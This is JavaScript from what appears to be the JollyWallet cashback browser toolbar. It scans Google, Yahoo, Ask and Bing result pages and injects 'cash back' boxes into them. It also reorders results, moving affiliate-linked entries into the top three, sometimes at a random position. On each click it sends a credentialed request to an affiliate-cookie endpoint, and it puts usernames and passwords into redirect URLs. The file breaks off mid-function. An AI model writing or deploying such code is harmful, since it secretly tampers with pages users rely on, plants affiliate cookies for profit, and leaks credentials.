var jw_ignore=(typeof Storage === 'undefined');
var jw_utils = {};
jw_utils.inArray = Array.prototype.indexOf ? function (arr, val) {if(typeof arr == 'undefined' ) return -1; return arr.indexOf(val) != -1;}:
function (arr, val) {var i = arr.length;while (i--) {if (arr[i] === val) return true;}	return false;};
jw_utils.getToken = function() {return 'ED4D4804-6179-F04E-FF7C-D036BB890245'; }; 
var jw_md5 = {};
jw_md5.extract_sub = function (url) {if(url=='') return null; if( url.indexOf('chrome-devtools://') === 0 )return null;var protocols = ['http://', 'https://', 'ftp://'];var a = this.removeStart(url,protocols);var prefix = ['www.', 'www2.','www22.','www1.','wwws.','www311.'];a = this.removeStart(a,prefix);
var b = a.split('?');var c = b[0].split('/');var d = c[0];
return d;};
jw_md5.removeStart = function (url, l){a = url;for (i = 0; i < l.length; i++) {p = l[i]; if (url.indexOf(p) === 0) {a = url.slice(p.length);break;}} return a;};
jw_md5.endsWith = function (str, suffix) {return str.indexOf(suffix, str.length - suffix.length) !== -1;};
jw_md5.BuildKeys = function (url) {if( url.indexOf('chrome-devtools://') === 0 )return null;var protocols = ['http://', 'https://', 'ftp://'];var a = this.removeStart(url,protocols);var prefix = ['www.', 'www2.','www22.','www1.','wwws.','www311.'];a = this.removeStart(a,prefix);
var b = a.split('?');var c = b[0].split('/');var d = c[0];var e = d.split('.');var e_len = e.length;
var domain_terminator = ['com','de','net','it','fr','ch','es','se','br','co','org','il','uk','nz','dk','cz','za','th','sk','sg','my','ph','hk','mx','ar', 'au','pt','fm', 'nl', 'us', 'ca', 'pl', 'eu', 'at', 'tv', 'info', 'ag', 'to', 'tr', 'biz', 'fi', 'ie', 'asia', 'bg', 'ro', 'mobi', 'be', 'hu', 'ru', 'no','cl', 'me', 'cn', 'in', 'cc', 'me', 'ua', 'nu', 'jp', 'ae', 'is', 'la', 'ma', 'pro','do','st','id', 'vn', 'edu', 'kr', 'xyz', 'vc', 'bz', 'club', 'ac', 'ne', 'or', 'coop', 'lv', 'clinic', 'tokyo', 'link', 'lv', 'lt', 'gr', 'mu', 'io', 'travel', 'pe', 'su', 'gr', 'ee', 'mu', 'je', 'pa', 'kw', 'gh', 'sa', 'eg', 'qa', 'bh', 'ci', 'ke', 'ng', 'tn', 'tw', 'kz', 'by', 'gov'];
	var i=0;var j=0;
for(i=0;i<domain_terminator.length;i++){
	if( e[e_len-1] == domain_terminator[i] ){
		e.splice(e_len-1,e_len-1);e_len--;
		for(j=0;j<domain_terminator.length;j++){
			if ( e[e_len-1] == domain_terminator[j] ){
				e.splice(e_len-1,e_len-1);
				e_len--;
			}}
	    if(e_len>1)e.splice(0, e_len-1);
	    break;}}
for (i = 0; i < e.length; i++) {e[i] = e[i].replace(/-/g,'_');e[i] = this.calcMD5(e[i]);}return e;};
jw_md5.rhex = function (num) {var hex_chr = '0123456789abcdef'; str = ''; for (var j = 0; j <= 3; j++)str += hex_chr.charAt((num >> (j * 8 + 4)) & 0x0F) + hex_chr.charAt((num >> (j * 8)) & 0x0F); return str;};
jw_md5.str2blks_MD5 = function (str) {
	var nblk = ((str.length + 8) >> 6) + 1;
	var blks = new Array(nblk * 16);
	var i=0;
	for (i = 0; i < nblk * 16; i++) blks[i] = 0;
	for (i = 0; i < str.length; i++) blks[i >> 2] |= str.charCodeAt(i) << ((i % 4) * 8);
	blks[i >> 2] |= 0x80 << ((i % 4) * 8);
	blks[nblk * 16 - 2] = str.length * 8;
	return blks;
};
jw_md5.add = function (x, y) {var lsw = (x & 0xFFFF) + (y & 0xFFFF);var msw = (x >> 16) + (y >> 16) + (lsw >> 16);	return (msw << 16) | (lsw & 0xFFFF);};
jw_md5.rol =function(num,cnt) { return (num << cnt) | (num >>> (32 - cnt));};
jw_md5.cmn =function(q,a,b,x,s,t)   { return this.add(this.rol(this.add(this.add(a, q), this.add(x, t)), s), b);};
jw_md5.ff = function(a,b,c,d,x,s,t) { return this.cmn((b & c) | ((~b) & d), a, b, x, s, t);};
jw_md5.gg = function(a,b,c,d,x,s,t) { return this.cmn((b & d) | (c & (~d)), a, b, x, s, t);};
jw_md5.hh = function(a,b,c,d,x,s,t) { return this.cmn(b ^ c ^ d, a, b, x, s, t);};
jw_md5.ii = function(a,b,c,d,x,s,t) { return this.cmn(c ^ (b | (~d)), a, b, x, s, t);};
jw_md5.calcMD5 = function(str) {
	var x = this.str2blks_MD5(str);
	var a = 1732584193; var b = -271733879; var c = -1732584194; var d = 271733878;
	for (var i = 0; i < x.length; i += 16) {
 var olda = a; var oldb = b; var oldc = c; var oldd = d;
 a=this.ff(a,b,c,d,x[i+0],7,-680876936); d = this.ff(d,a,b,c,x[i + 1], 12, -389564586);	c = this.ff(c, d, a, b, x[i + 2], 17, 606105819);		b = this.ff(b, c, d, a, x[i + 3], 22, -1044525330);
 a=this.ff(a,b,c,d,x[i+4],7,-176418897); d = this.ff(d,a,b,c,x[i + 5], 12, 1200080426);	c = this.ff(c, d, a, b, x[i + 6], 17, -1473231341);	b = this.ff(b, c, d, a, x[i + 7], 22, -45705983);
 a=this.ff(a,b,c,d,x[i+8],7,1770035416); d = this.ff(d,a,b,c,x[i + 9], 12, -1958414417);	c = this.ff(c, d, a, b, x[i + 10], 17, -42063);		b = this.ff(b, c, d, a, x[i + 11], 22, -1990404162);
 a=this.ff(a,b,c,d,x[i+12],7,1804603682);d = this.ff(d,a,b,c,x[i + 13], 12, -40341101);	c = this.ff(c, d, a, b, x[i + 14], 17, -1502002290);	b = this.ff(b, c, d, a, x[i + 15], 22, 1236535329);
 a=this.gg(a,b,c,d,x[i+1],5,-165796510); d = this.gg(d,a,b,c,x[i + 6], 9, -1069501632);	c = this.gg(c, d, a, b, x[i + 11], 14, 643717713);	b = this.gg(b, c, d, a, x[i + 0], 20, -373897302);
 a=this.gg(a,b,c,d,x[i+5],5,-701558691); d = this.gg(d,a,b,c,x[i + 10], 9, 38016083);		c = this.gg(c, d, a, b, x[i + 15], 14, -660478335);	b = this.gg(b, c, d, a, x[i + 4], 20, -405537848);
 a=this.gg(a,b,c,d,x[i+9],5,568446438);	 d = this.gg(d,a,b,c,x[i + 14], 9, -1019803690);	c = this.gg(c, d, a, b, x[i + 3], 14, -187363961);	b = this.gg(b, c, d, a, x[i + 8], 20, 1163531501);
 a=this.gg(a,b,c,d,x[i+13],5,-1444681467);d = this.gg(d,a,b,c,x[i + 2], 9, -51403784);		c = this.gg(c, d, a, b, x[i + 7], 14, 1735328473);	b = this.gg(b, c, d, a, x[i + 12], 20, -1926607734);
 a=this.hh(a,b,c,d,x[i+5],4,-378558);d=this.hh(d,a,b,c,x[i + 8], 11, -2022574463);	c = this.hh(c, d, a, b, x[i + 11], 16, 1839030562);	b = this.hh(b, c, d, a, x[i + 14], 23, -35309556);
 a=this.hh(a,b,c,d,x[i+1],4,-1530992060);d = this.hh(d,a,b,c,x[i + 4], 11, 1272893353);	c = this.hh(c, d, a, b, x[i + 7], 16, -155497632);	b = this.hh(b, c, d, a, x[i + 10], 23, -1094730640);
 a=this.hh(a,b,c,d,x[i+13],4,681279174); d = this.hh(d,a,b,c,x[i + 0], 11, -358537222);	c = this.hh(c, d, a, b, x[i + 3], 16, -722521979);	b = this.hh(b, c, d, a, x[i + 6], 23, 76029189);
 a=this.hh(a,b,c,d,x[i+9],4,-640364487); d = this.hh(d,a,b,c,x[i + 12], 11, -421815835);	c = this.hh(c, d, a, b, x[i + 15], 16, 530742520);	b = this.hh(b, c, d, a, x[i + 2], 23, -995338651);
 a=this.ii(a,b,c,d,x[i+0],6,-198630844); d = this.ii(d,a,b,c,x[i + 7], 10, 1126891415);	c = this.ii(c, d, a, b, x[i + 14], 15, -1416354905);	b = this.ii(b, c, d, a, x[i + 5], 21, -57434055);
 a=this.ii(a,b,c,d,x[i+12],6,1700485571);d = this.ii(d,a,b,c,x[i + 3], 10, -1894986606);	c = this.ii(c, d, a, b, x[i + 10], 15, -1051523);		b = this.ii(b, c, d, a, x[i + 1], 21, -2054922799);
 a=this.ii(a,b,c,d,x[i+8],6,1873313359); d = this.ii(d,a,b,c,x[i + 15], 10, -30611744);	c = this.ii(c, d, a, b, x[i + 6], 15, -1560198380);	b = this.ii(b, c, d, a, x[i + 13], 21, 1309151649);
 a=this.ii(a,b,c,d,x[i+4],6,-145523070); d = this.ii(d,a,b,c,x[i + 11], 10, -1120210379);	c = this.ii(c, d, a, b, x[i + 2], 15, 718787259);		b = this.ii(b, c, d, a, x[i + 9], 21, -343485551);
 a=this.add(a,olda);b = this.add(b, oldb);c = this.add(c, oldc);d = this.add(d, oldd);
	}
	return this.rhex(a) + this.rhex(b) + this.rhex(c) + this.rhex(d);
};
//
//	jollywallet search interface file 
//

var _jw_search = {};
_jw_search.urls = new Array();
_jw_search.urls_pos = new Array();
_jw_search._tmp_index = 0;
_jw_search.tid='';
_jw_search.dist=0;
_jw_search.dist_sub='';
_jw_search.index=0;
_jw_search.jw_debug_mode = false;

jw_jquery = (typeof jw_jquery != "undefined") ? jw_jquery : null;
if(jw_jquery==null){if(typeof $ != "undefined")	jw_jquery = $;}

_jw_search.init = function(){
	_jw_search.urls = new Array();
	_jw_search.urls_pos = Array();
	_jw_search._tmp_index = 0;
};

//client
//------
_jw_search.browse = function(pid,token,uname,pwd){
	var link = 'http://www.jollywallet.com/jollywallet/redirect?t=search&tid='+this.tid+'&deal='+pid+'&ref='+this.index;
	if(token && (token != '')) link += '&token=' + token;
	if(uname){
		link+='&newuser=1&user='+uname;
		if(pwd){
			link+='&pwd='+pwd;
			this.createCookie("jw_state", 2);
		}
	}
	//document.location = link;
	setTimeout(function(){try{jw_jquery('#jw_popup').remove();}catch(e){}},10);
	window.open(link,'_blank');
};

_jw_search.click = function(e, icon, cb, name, pid) {
	var token = tbView.getCookie("jw_token");
	this.browse(pid,token,null,null);
//	_jw_search.jw_stop_propagation(e);
};

//_jw_search.jw_stop_propagation=function(e){
//	if(e && e.stopPropagation) {e.stopPropagation();} 
//	else {e = window.event;	e.cancelBubble = true;}	
//};

_jw_search.process=function(n,s){
	s = s.replace(/\s+/g, '');
	s = s.replace("www.", '');
	
	//17042014
	var term = [".com",".de",".net",".it",".fr",".ch",".es",".se",".br",".co",".org",".il",".uk",".nz",".dk",".cz",".za",".th",".sk",".sg",".my",".ph",".hk",".mx",".ar", ".au",".pt", ".fm", ".nl", ".us", ".ca", ".pl", ".eu", ".at", ".tv", ".info", ".ag", ".to", ".tr", ".biz", ".fi", ".ie", ".asia", ".bg", ".ro", ".mobi", ".be", ".hu", ".ru", ".no",".cl", ".me", ".cn", ".in", ".cc", ".me", ".ua", ".nu", ".jp", ".ae", ".is", ".la", ".ma", ".pro",".do",".st", ".id", ".vn", ".edu", ".kr", ".xyz", ".vc", ".bz", ".club", ".ac", ".ne", ".or", ".coop", ".lv", ".clinic", ".tokyo", ".link", ".lv", ".lt", ".gr", ".mu", ".io", ".travel", ".pe", ".su", ".gr", ".ee", ".mu", ".je", ".pa", ".kw", ".gh", ".sa", ".eg", ".qa", ".bh", ".ci", ".ke", ".ng", ".tn", ".tw", ".kz", ".by", ".gov"];

	var domain="";
	r=s.indexOf("/");
	if(r>1) s = s.substring(0,r);
	parts=s.split(".");
	var index=parts.length-1;
	var last=index;
	while(index>=0){
		pi="."+parts[index];
		if(term.indexOf(pi) == -1 ){break;}
		index--;
	}
	if(index<last){
		for(var i=index; i<=last; i++) {
			if(domain !="") { domain +="."; found=true; }
			domain+=parts[i];
		}
		if(n.id =="") {
			if( (typeof _jw_search._tmp_index) == "undefined")	_jw_search._tmp_index=0;
			_jw_search._tmp_index=_jw_search._tmp_index+1;
			n.id = "jw_box_"+_jw_search._tmp_index;
		}
		d=domain.toLowerCase();
		this.urls_pos[n.id]=d;
		if(this.urls.indexOf(d)== -1)
			this.urls.push(d);
	}
};

_jw_search.walk_the_DOM = function jw_walk(node, func) {
	if(func(node)){
		node = node.firstChild;
		while (node) {jw_walk(node, func);node = node.nextSibling;}
	}
};

_jw_search.dom_scanner = function(index){
//	try{
		this.index=index;
		var _hook="";
		var _bypass="";
		var _link="";
		switch(index){
			case 1:	// snap
				_hook="search-result";
				_bypass="displayUrl";
				_link="displayUrl";
				break;
			case 2:
				_hook="ptbs ur";
				_bypass="";
				_link=".durl";
				break;
			case 3:	// bing
				_hook="sa_mc";
				_bypass="sb_tlst";
				_link="sb_meta";
				break;
			case 4:	// AOL
				_hook="sa_mc";
				_bypass="sb_tlst";
				_link="sb_meta";
				break;
			case 5:
				_hook="res"; 
				_bypass="";
				_link=".url";
				break;
			case 6:	// google
				_hook="rc"; 
				_bypass="";
				_link="h3 a";
				break;
			default:
				return false;
		}
		
		var root_node = document.body;
		if (index==5){
			var ol_elements = jw_jquery('body').find('#web ol');
			var ptr = -1;
			for(var i=0; i<ol_elements.length; i++){
				var o = jw_jquery(ol_elements[i]);
				if (o.attr('data-bns')=='API'){
					ptr = i;
					break;
				}
			}
			if (ptr>=0)
				root_node = ol_elements[ptr];
		}else if (index==2){
			root_node = document.getElementById('lindm');
		}else if (index==6){
			root_node = document.getElementById('ires');
		}
		if (!root_node) root_node = document.body;
		if (jw_jquery('#jw_box_1').lenght>0) return;
		
		_jw_search.walk_the_DOM(root_node, 
			function(node) {
				var txt;
				if (node.className && node.className.length>0 && node.className==_hook){
					if (index==2 || index==5){
						txt = jw_jquery(node).find(_link).text();
						_jw_search.process(node,txt.replace('http://','').replace('https://',''));
					} else if (index==6){
						txt = jw_jquery(node).find(_link).attr('href');
						_jw_search.process(node,txt.replace('http://','').replace('https://',''));
					} else {	//older code
						var child_node=node.firstChild;
						if(_bypass != "")
							while(child_node && child_node.className != _bypass) 
								child_node = child_node.nextSibling;
						if(index==2)
							while(child_node && (child_node.className === undefined || child_node.className =="")) 
								child_node = child_node.nextSibling;
						if(child_node) {
							if(child_node && child_node.className == _link){
								var txt = jw_jquery(child_node).text();
								_jw_search.process(node,txt.replace('http://','').replace('https://',''));
							}
						}
					}
					return false;
				}
				return true;
		});
//	}catch(ex){if(this.jw_debug_mode)alert(ex.message);}
};

_jw_search.dotter = function (str, max_len){
	if (!str) return '';
	if (str.length<=max_len)return str;
	var strx = str.substr(0, max_len-2);
	var idx = strx.lastIndexOf(' ');
	return strx.substr(0, idx)+'...';
};

_jw_search.update_node=function(n,data,t2){
//	try{
		if(typeof(data) == 'undefined' || data == null)
			return;
		if(typeof(t2) == 'undefined' || t2 == null)
			t2=0;
		var d=jw_jquery.parseJSON(data);
		var _name = d.name.replace(/'/g,'`');
		var title = d.cb +' Cash back on '+_name+'.';
		
		var o = jw_jquery(document.getElementById(n));
		if (o.length<1) return;
		var float_dir = (o.css('direction')=='rtl' ? 'right' : 'left');
		if(o.find('.jw_search_info_box').length>0) return;

		var h='\
			<div class="jw_search_info_box" jw_deal_id="'+(d.deal?d.deal:'')+'" jw_host_id="'+(d.host?d.host:'')+'"'+ (t2==0 ? ' onclick="_jw_search.click(event,this,\''+d.cb+'\',\''+_name+'\',\''+d.deal+'\');"' : '')+'>\
				<div style="height:24px;float:'+float_dir+';">\
					<img class="jw_search_info_img" src="//www.jollywallet.com/resources/images/jw/logo_22X22u.png" />\
				</div>\
				<div class="jw_search_info_title" style="text-align:'+float_dir+';line-height:20px;'+(this.index==6 ? 'text-decoration:none;font-size:20px;' : '')+'">'+_jw_search.dotter(title,45)+'</div>\
			</div>';

		if (t2==0){
			o.prepend(h);
		}else if (t2==1) {
			if(this.index==5){
				var titlex = o.find('.yschttl');
				titlex.prepend(h);
			} else if (this.index==2){
				var t =  o.find('h3 a');
				t.prepend(h);
			} else if (this.index==6){
				var t =  o.find('h3 a');
				t.prepend(h);
			}
		}
//	}catch(ex){if(this.jw_debug_mode)alert(ex.message);}
};

_jw_search.jw_tab_maker = function(index){
//	try{
		var css_index='';
		if(index==2) css_index='2';
		return '\
			<div id="jw_tab_box'+css_index+'">\
				<div id="jw_tab" onclick="_jw_search.jw_tab_click();">\
					<div id="jw_tab_logo" title="jollywallet\'s Cash back offers"></div>\
					<div id="jw_tab_text" class="jw_unselectable">Cash back offers</div>\
					<div id="jw_tab_arrow" class="jw_tab_arrow_down"></div>\
					<div id="jw_tab_close" title="Close" class="jw_unselectable" \
						onclick="jw_jquery(\'#jw_tab_box\').remove();"><img src="//www.jollywallet.com/resources/images/jw/x_8.png" border="0" /></div>\
				</div>\
				<div id="jw_tab_lines_box"></div>\
			</div>';
//	}catch(ex){if(this.jw_debug_mode)alert(ex.message);}
};

_jw_search.jw_tab_line_maker = function(cb, name, deal, logo){
	var text = cb + ' cash back on '+name+'.';
	return '\
		<div class="jw_tab_line" onclick="_jw_search.click(event,this,\''+cb+'\',\''+name+'\',\''+deal+'\');;">\
			<div class="f_left" style="width:100px;height:30px;text-align:center;">\
				<img title="'+text+'" style="max-width:100px;max-height:30px;" src="'+logo+'">\
			</div>\
			<div style="position:absolute;left:120px;top:5px;overflow:hidden;height:30px;">\
				<span class="jw_tab_line_text jw_unselectable">'+text+'</span></div>\
		</div>';
};

_jw_search.jw_tab_click = function(){
	var h = jw_jquery('#jw_tab_box').height();
	if (h>0){
		jw_jquery('#jw_tab_lines_box').slideUp();
		jw_jquery('#jw_tab_arrow').removeClass('jw_tab_arrow_up').addClass('jw_tab_arrow_down');
	} else {
		jw_jquery('#jw_tab_lines_box').slideDown();
		jw_jquery('#jw_tab_arrow').removeClass('jw_tab_arrow_down').addClass('jw_tab_arrow_up');
	}			
};

_jw_search.t1=function(data,index){
//	try{
		var count = 0;
		for (var prop in data){
			if (prop!='display') count++;
		}
		if (count<1) return;	//there are no relevant cashbacks. don't show the tab
		
		jw_jquery('body').append(_jw_search.jw_tab_maker(index));
		
		for (var prop in data){
			if (prop=='display') continue;
			var obj = JSON.parse(data[prop]);
			var cb = obj.cb;
			var name = obj.name;
			var deal = obj.deal;
			var logo = '//www.jollywallet.com/resources/images/jw/icon_30x30_usd.png';
			if(obj.logo) logo = obj.logo;
			jw_jquery('#jw_tab_lines_box').append(_jw_search.jw_tab_line_maker(cb, name, deal, logo)); 
		}
//	}catch(ex){if(this.jw_debug_mode)alert(ex.message);}
};

_jw_search.stat_str_maker = function(arr, index, se_index, t_arr){
//	try{
		var t_str = ''; 
		jw_jquery.each(t_arr, function(idx,val){t_str+=val.toString();});
		var str = se_index+'_'+t_str+'_';
		jw_jquery.each(arr, function(idx,val){
			str += (val + 2*(index==idx ? 1 : 0)).toString();
		});
		return str;
//	}catch(ex){if(this.jw_debug_mode)alert(ex.message);}
	return '';
};

_jw_search.jw_reporter = function($this, se_idx){
//	try{
		var url, key = $this.attr('jw_stat_key');
		if (!key) key = '';
		var deal_id = $this.attr('jw_deal_id');
		if (!deal_id) deal_id='';
		
		if (deal_id.length>0){
			//url = '//www.jollywallet.com/affiliate_cookie?deal='+deal_id+'&token='+jw_utils.getToken()+'&rnd='+Math.random();
			//jw_jquery.post(url, '{}', function(obj){});
			url = '//www.jollywallet.com/affiliate_cookie?deal='+deal_id+'&ref='+se_idx+'&rnd='+Math.random();
			jw_jquery.ajax({
				type: "GET",
				url: url,
				cache: false,
				crossDomain: true,
				dataType: 'json',
				xhrFields: {withCredentials: true}
			});
		}
//		var host_id = $this.find('.jw_search_info_box').attr('jw_host_id');
//		if (!host_id) host_id='';
		url = '//www.jollywallet.com/affiliate_analyze?root=search&key='+key+'&rnd='+Math.random();
		jw_jquery('#jw_omni_iframe').attr('src',url);
//	}catch(ex){if(this.jw_debug_mode)alert(ex.message);}
};

_jw_search.t3_yahoo = function(t_arr){
//	try{
		var ptr=0, is_jw_added, max_len, i, h3, deal_id;
		var ol = jw_jquery('#web ol');
		if (ol.length<1) return;	//not found or no search entries
		if (ol.children('li').length<2) return;	//nothing to relocate
		max_len = ol.children('li').length;
	
		for(i=1; i<=max_len;i++){
			li = jw_jquery('#jw_box_'+i).parent();
			if (li.find('.jw_search_info_box').length<1)continue;
			if (i==1) { 		//first anyway
				ptr = 1;
			}else if (ptr<1){	//make it first
				li.insertBefore(ol.children('li')[0]);
				ptr = i;
			}else{				//stick it after the last jw element
				li.insertAfter(jw_jquery('#jw_box_'+ptr).parent());
				ptr = i;
			}
		}

		var arr = new Array();	//tells which entries (after relocate) have jw cashback
		for (i=0; i<max_len; i++){
			li = jw_jquery(ol.children('li')[i]);
			is_jw_added = (li.find('.jw_search_info_box').length>0 ? 1 : 0);
			arr.push(is_jw_added);
		}

		for (i=0; i<max_len; i++){
			li = jw_jquery(ol.children('li')[i]);
			h3 = li.find('h3');
			if (h3.length<1) continue;
			deal_id = h3.find('.jw_search_info_box').attr('jw_deal_id');
			if (deal_id && deal_id.length>0)
				h3.attr('jw_deal_id',deal_id);
			h3.attr('jw_stat_key', this.stat_str_maker(arr, i, this.index, t_arr));
			h3.click(function(){
				_jw_search.jw_reporter(jw_jquery(this),5);
			});
		}
//	}catch(ex){if(this.jw_debug_mode)alert(ex.message);}
};

_jw_search.t3_ask = function(t_arr){
//	try{
		var ptr=0, is_jw_added, h3, deal_id, max_len=0;
		var header = jw_jquery('#lindm .sectionheader');
		if (header.length<1) return;
		
		while (jw_jquery('#jw_box_'+(max_len+1)).length>0)
			max_len++;
		
		for(var i=1; i<=max_len;i++){
			var o = jw_jquery('#jw_box_'+i).parent();
			if (o.find('.jw_search_info_box').length<1)continue;
			if (ptr<1){	//make it first
				o.insertAfter(header);
				ptr = i;
			}else{				//stick it after the last jw element
				o.insertAfter(jw_jquery('#jw_box_'+ptr).parent());
				ptr = i;
			}
		}
		
		var arr = new Array();	//tells which entries (after relocate) have jw cashback
		jw_jquery.each(jw_jquery('.tsrc_tled'), function(idx, ox) {
			var o = jw_jquery(ox);
			is_jw_added = (o.find('.jw_search_info_box').length>0 ? 1 : 0);
			arr.push(is_jw_added);
		});
		
		jw_jquery.each(jw_jquery('.tsrc_tled'), function(idx, ox) {
			var o = jw_jquery(ox);
			h3 = o.find('h3');
			if (h3.length<1) return;
			deal_id = h3.find('.jw_search_info_box').attr('jw_deal_id');
			if (deal_id && deal_id.length>0)
				h3.attr('jw_deal_id',deal_id);
			h3.attr('jw_stat_key', _jw_search.stat_str_maker(arr, idx, _jw_search.index,t_arr));
			h3.click(function(){
				_jw_search.jw_reporter(jw_jquery(this),2);
			});
		});
//	}catch(ex){if(this.jw_debug_mode)alert(ex.message);}
};

_jw_search.t4_google = function(t_arr){
//	try{
		var max_len, is_jw_added, i, id, h3, deal_id, num_of_entries=0, entry, sub_entry, child;
		var res_box = jw_jquery('#ires');
		if (res_box.length<1) return;	//not found or no search entries
		num_of_entries = res_box.find('.g').length;

		max_len=0;
		while(jw_jquery('#jw_box_'+(max_len+1)).length>0){
			max_len++;
		}
		
		for(i=1; i<=max_len;i++){
			entry = jw_jquery('#jw_box_'+i);
			if (entry.find('.jw_search_info_box').length<1)continue;
			if (i<=3) break;	//there is one in the top 3
			var rnd_pos = Math.floor((Math.random() * 3) + 1);
			jw_jquery(entry[0]).parent().insertBefore(jw_jquery('#jw_box_'+rnd_pos).parent());
			break;
		}

		
		var arr = new Array();	//tells which entries (after relocate) have jw cashback
		
		jw_jquery.each(jw_jquery('.rc'), function(index, item) {
			var entry = jw_jquery(item);
			id = entry.attr('id');
			h3 = entry.find('h3');
			if (h3.length>0){
				is_jw_added = (entry.find('.jw_search_info_box').length>0 ? 1 : 0);
				arr.push(is_jw_added);
			}else{
				arr.push(0);
			}
		});
		
		for(i=0; i<num_of_entries; i++){
			child = jw_jquery('#jw_box_'+(i+1));
			if (child.length<1) continue;	//should not happen
			var clx = child.find('h3');
			if (clx.length<1) continue;
			h3 = jw_jquery(clx[0]);
			deal_id = h3.find('.jw_search_info_box').attr('jw_deal_id');
			if (deal_id && deal_id.length>0){
				h3.attr('jw_deal_id',deal_id);
				h3.attr('jw_stat_key', _jw_search.stat_str_maker(arr, i, this.index, t_arr));
				h3.click(function(){
					_jw_search.jw_reporter(jw_jquery(this),6);
				});
			}
		}
		
//	}catch(ex){
//		alert('error 49113: '+ex.message);
//	}
};

_jw_search.t4_yahoo = function(t_arr){
//	try{
		var max_len, is_jw_added, i, res, id, h3, deal_id;
		var ol = jw_jquery('#web ol');
		if (ol.length<1) return;	//not found or no search entries
		if (ol.children('li').length<2) return;	//nothing to relocate
		
		jw_jquery('<style>#web a{outline:none !important;}</style>').appendTo('head');

		max_len=0;
		while(jw_jquery('#jw_box_'+(max_len+1)).length>0){
			max_len++;
		}

		for(i=1; i<=max_len;i++){
			li = jw_jquery('#jw_box_'+i).parent();
			if (li.find('.jw_search_info_box').length<1)continue;
			if (i<=3) break;	//there is one in the top 3
			var rnd_pos = Math.floor((Math.random() * 3) + 1);
			li.insertBefore(jw_jquery('#jw_box_'+rnd_pos).parent());
			break;
		}

		var arr = new Array();	//tells which entries (after relocate) have jw cashback
		i=0;
		while (i < ol.children('li').length){
			li = jw_jquery(ol.children('li')[i]);
			h3 = li.find('h3');
			if (h3.length>0){	//if h3 not found it probably means it is an image entry.
				res = li.find('.res');
				if (res.length>0){
					id = res.attr('id');
					if (!id) id = '';
					if (id.indexOf('jw_')>=0){
						is_jw_added = (li.find('.jw_search_info_box').length>0 ? 1 : 0);
						arr.push(is_jw_added);
					}
				}
			}
			i++;
		}

		i=0;
		var arr_ptr = 0;
		while (i < ol.children('li').length){
			li = jw_jquery(ol.children('li')[i]);
			h3 = li.find('h3');
			if (h3.length>0){	//if h3 not found it probably means it is an image entry.
				res = li.find('.res');
				if (res.length>0){
					id = res.attr('id');
					if (!id) id = '';
					if (id.indexOf('jw_')>=0){
						deal_id = h3.find('.jw_search_info_box').attr('jw_deal_id');
						if (deal_id && deal_id.length>0)
							h3.attr('jw_deal_id',deal_id);
						h3.attr('jw_stat_key', this.stat_str_maker(arr, arr_ptr, this.index,t_arr));
						h3.click(function(){
							_jw_search.jw_reporter(jw_jquery(this),5);
						});
						arr_ptr++;
					}
				}
			}
			i++;
		}
//	}catch(ex){if(this.jw_debug_mode)alert(ex.message);}
};

_jw_search.t4_ask = function(t_arr){
//	try{
		var deal_id, max_len, i, h3, ptbs;
		if (jw_jquery('#lindm').length<1) return;
		jw_jquery('<style>a{outline:none !important;}</style>').appendTo('head');
		
		max_len=0;
		while (jw_jquery('#jw_box_'+(max_len+1)).length>0)
			max_len++;
		
		for(i=1; i<=max_len;i++){
			var o = jw_jquery('#jw_box_'+i).parent();
			if (o.find('.jw_search_info_box').length<1)continue;
			if (i<=3) break;	//there is one in the top 3
			var rnd_pos = Math.floor((Math.random() * 3) + 1);
			o.insertBefore(jw_jquery('#jw_box_'+rnd_pos).parent());
		}
		
		var arr = new Array();	//tells which entries (after relocate) have jw cashback
		jw_jquery.each(jw_jquery('.tsrc_tled'), function(idx, ox) {
			var o = jw_jquery(ox);
			h3 = o.find('h3');
			if (h3.length>0){
				ptbs = o.find('.ptbs');
				if (ptbs.length>0){
					id = ptbs.attr('id');
					if (!id) id = '';
					if (id.indexOf('jw_')>=0){
						is_jw_added = (o.find('.jw_search_info_box').length>0 ? 1 : 0);
						arr.push(is_jw_added);
					}
				}
			}
		});

		var arr_ptr = 0;
		jw_jquery.each(jw_jquery('.tsrc_tled'), function(idx, ox) {
			var o = jw_jquery(ox);
			h3 = o.find('h3');
			if (h3.length>0){
				ptbs = o.find('.ptbs');
				if (ptbs.length>0){
					id = ptbs.attr('id');
					if (!id) id = '';
					if (id.indexOf('jw_')>=0){
						deal_id = h3.find('.jw_search_info_box').attr('jw_deal_id');
						if (deal_id && deal_id.length>0)
							h3.attr('jw_deal_id',deal_id);
						h3.attr('jw_stat_key', _jw_search.stat_str_maker(arr, arr_ptr, _jw_search.index, t_arr));
						h3.click(function(){
							_jw_search.jw_reporter(jw_jquery(this),2);
						});
						arr_ptr++;
					}
				}
			}
		});
//	}catch(ex){if(this.jw_debug_mode)alert(ex.message);}
};

_jw_search.t3=function(t_arr){	//relocate all
	switch(this.index){
		case 2:
			this.t3_ask(t_arr);
			break;
		case 5:
			this.t3_yahoo(t_arr);
			break;
		default:
			//do nothing
	}
};

_jw_search.t4=function(t_arr){	//relocate one to top 3
	switch(this.index){
		case 2:
			this.t4_ask(t_arr);
			break;
		case 5:
			this.t4_yahoo(t_arr);
			break;
		case 6:
			this.t4_google(t_arr);
			break;
		default:
			//do nothing
	}
};

// google 
_jw_search.last_gtoken = 'not_set_yet';

_jw_search.get_gtoken = function(){
	if (jw_jquery){	//jw_jquery may not be available on page load
		var g_stats = jw_jquery('#resultStats');
        var txt = g_stats.text();
        if (!txt)return '';
        return txt.replace(/[ ,)\.(]/g, '-').toUpperCase();
	}
	return '';
};

_jw_search.g_is_page_changed = function(){	//return g_token if page changed, '' otherwise
	var current_gtoken = this.get_gtoken();
	if (current_gtoken.length<1) 
			return '';
	if (current_gtoken == this.last_gtoken)
			return '';
    if (jw_jquery('#jw_box_1').lenght>0) return '';
	return current_gtoken;
};

_jw_search.g_search = function(){
	var current_gtoken = _jw_search.g_is_page_changed(); 
	if (current_gtoken.length>0){
		this.last_gtoken = current_gtoken;
		tbView.start_search(6);
	}
};
var tbView={};
tbView.tname='bar';
tbView.tver='1';
tbView.domain='jollywallet.com';
tbView.bl=['.facebook.com','.google.','mail.yahoo','ads.yahoo','www.yahoo','toolbar.yahoo','in.yahoo','hk.yahoo','answers.yahoo','tw.yahoo','news.yahoo','br.yahoo','mx.yahoo','.amazon.com','.doubleclick.net','.atdmt.com','.uol.com.br','bing.com','192.168.','.microsoft.com'];
tbView.unti_bl=['advertise.bingads.microsoft.com', 'bing.com/explore/rewards'];
tbView.isInBlackListLocal = function(url) {
	var d1='';var i=0;var j=0;
	for(i=0;i<this.bl.length;i++)
	{
		d1=this.bl[i];
		if((d1!='search.yahoo')&&(url.indexOf(d1) >= 0)){
			var in_ubl=false;
